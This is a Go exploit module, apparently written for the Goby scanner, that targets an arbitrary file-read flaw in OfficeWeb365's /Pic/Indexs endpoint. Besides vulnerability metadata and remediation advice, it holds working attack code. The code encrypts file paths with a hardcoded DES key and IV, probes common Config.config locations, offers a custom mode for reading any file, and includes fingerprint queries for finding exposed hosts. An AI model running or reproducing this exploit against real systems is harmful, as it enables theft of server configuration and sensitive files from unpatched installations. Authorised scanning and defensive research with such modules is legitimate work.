package exploits

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OfficeWeb365 indexes  file read vulnerability",
    "Description": "<p>OfficeWeb365 focuses on online preview of Office documents and PDF document cloud services, including Microsoft Word document online preview, Excel spreadsheet online preview, PowerPoint presentation document online preview, WPS word processing, WPS spreadsheet, WPS presentation, and Adobe PDF document online preview.</p><p>There is an arbitrary file read vulnerability at the OfficeWeb365/Pic/Index interface, which allows attackers to encrypt payloads through unique encryption methods, read arbitrary files, obtain sensitive server information, and put the system in an extremely insecure state.</p>",
    "Product": "DAXI-OfficeWeb365",
    "Homepage": "https://officeweb365.com/Help/Default",
    "DisclosureDate": "2024-01-09",
    "PostTime": "2024-01-10",
    "Author": "zou",
    "FofaQuery": "body=\"请输入furl参数\" || header=\"OfficeWeb365\" || banner=\"OfficeWeb365\"",
    "GobyQuery": "body=\"请输入furl参数\" || header=\"OfficeWeb365\" || banner=\"OfficeWeb365\"",
    "Level": "3",
    "Impact": "<p>Attackers can encrypt payloads using unique encryption methods, read arbitrary files, obtain sensitive server information, and put the system in an extremely insecure state.</p>",
    "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.officeweb365.com/\">https://www.officeweb365.com/</a></p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p><p>3. Filter sensitive characters such as ../ so that users cannot go back to the upper directory in the URL.</p><p>4. When downloading a file, the best way to determine the input path is that the file should have a one-to-one correspondence in the database to avoid obtaining the file by entering an absolute path.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "config,custom",
            "show": ""
        },
        {
            "name": "file",
            "type": "input",
            "value": "C:/OfficeWeb365/officeweb/Config.config",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "OfficeWeb365 Indexs 文件读取漏洞",
            "Product": "大西科技-OfficeWeb365",
            "Description": "<p>OfficeWeb365 专注于 Office 文档在线预览及 PDF 文档在线预览云服务，包括 Microsoft Word 文档在线预览、Excel 表格在线预览、Powerpoint 演示文档在线预览，WPS 文字处理、WPS 表格、WPS 演示及 Adobe PDF 文档在线预览。<br></p><p>OfficeWeb365 /Pic/Indexs 接口处存在任意文件读取漏洞，攻击者可通过独特的加密方式对 payload 进行加密，读取任意文件，获取服务器敏感信息，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.officeweb365.com/\">https://www.officeweb365.com/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、过滤../等敏感字符，使用户在url中不能回溯上级目录。</p><p>4、文件下载时判断输入的路径，最好的方法是文件应该在数据库中进行一一对应，避免通过输入绝对路径来获取文件。</p>",
            "Impact": "<p>攻击者可通过独特的加密方式对 payload 进行加密，读取任意文件，获取服务器敏感信息，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "OfficeWeb365 indexes  file read vulnerability",
            "Product": "DAXI-OfficeWeb365",
            "Description": "<p>OfficeWeb365 focuses on online preview of Office documents and PDF document cloud services, including Microsoft Word document online preview, Excel spreadsheet online preview, PowerPoint presentation document online preview, WPS word processing, WPS spreadsheet, WPS presentation, and Adobe PDF document online preview.</p><p>There is an arbitrary file read vulnerability at the OfficeWeb365/Pic/Index interface, which allows attackers to encrypt payloads through unique encryption methods, read arbitrary files, obtain sensitive server information, and put the system in an extremely insecure state.</p>",
            "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.officeweb365.com/\" target=\"_blank\">https://www.officeweb365.com/</a></p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p><p>3. Filter sensitive characters such as ../ so that users cannot go back to the upper directory in the URL.</p><p>4. When downloading a file, the best way to determine the input path is that the file should have a one-to-one correspondence in the database to avoid obtaining the file by entering an absolute path.</p>",
            "Impact": "<p>Attackers can encrypt payloads using unique encryption methods, read arbitrary files, obtain sensitive server information, and put the system in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10905"
}`

	sendPayloadRequest := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		plainBytes := []byte(payload)
		block, _ := des.NewCipher([]byte{102, 16, 93, 156, 78, 4, 218, 32})
		padding := block.BlockSize() - len(plainBytes)%block.BlockSize()
		padText := bytes.Repeat([]byte{byte(padding)}, padding)
		plainBytes = append(plainBytes, padText...)
		cipherText := make([]byte, len(plainBytes))
		mode := cipher.NewCBCEncrypter(block, []byte{55, 103, 246, 79, 36, 99, 167, 3})
		mode.CryptBlocks(cipherText, plainBytes)
		payload = base64.StdEncoding.EncodeToString(cipherText) + "09"
		sendPayloadConfig := httpclient.NewGetRequestConfig(fmt.Sprintf("/Pic/Indexs?imgs=%s", payload))
		sendPayloadConfig.VerifyTls = false
		sendPayloadConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendPayloadConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			var files []string
			//不论OfficeWeb365安装在哪个目录，目录遍历起点都在C:/windows/ststem32/。需要遍历几个较通用的配置文件路径
			files = append(files, "C:/OfficeWeb365/officeweb/Config.config", "D:/OfficeWeb365/officeweb/Config.config", "E:/OfficeWeb365/officeweb/Config.config", "C:/OfficeWeb365/Config.config")
			for _, file := range files {
				if resp, err := sendPayloadRequest(hostInfo, file); err == nil && resp != nil && strings.Contains(resp.Utf8Html, "OfficeWeb365Config") {
					ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path + "?" + resp.Request.URL.RawQuery
					return true
					//如果响应未出现 “未能找到” 和 配置文件路径 等关键字，说明不存在漏洞，不再继续遍历路径
				} else if resp != nil && !strings.Contains(resp.Utf8Html, "未能找到") && !strings.Contains(resp.Utf8Html, file) {
					return false
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var files []string
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "config" {
				files = append(files, "C:/OfficeWeb365/officeweb/Config.config", "D:/OfficeWeb365/officeweb/Config.config", "E:/OfficeWeb365/officeweb/Config.config", "C:/OfficeWeb365/Config.config")
			} else if attackType == "custom" {
				files = append(files, stepLogs.Params["file"].(string))
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			for _, file := range files {
				if resp, err := sendPayloadRequest(expResult.HostInfo, file); resp != nil && !strings.Contains(resp.Utf8Html, "error") {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
					break
				} else if err != nil {
					expResult.Output = err.Error()
					break
				}
			}
			if expResult.Output == "" || len(expResult.Output) == 0 {
				expResult.Success = false
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
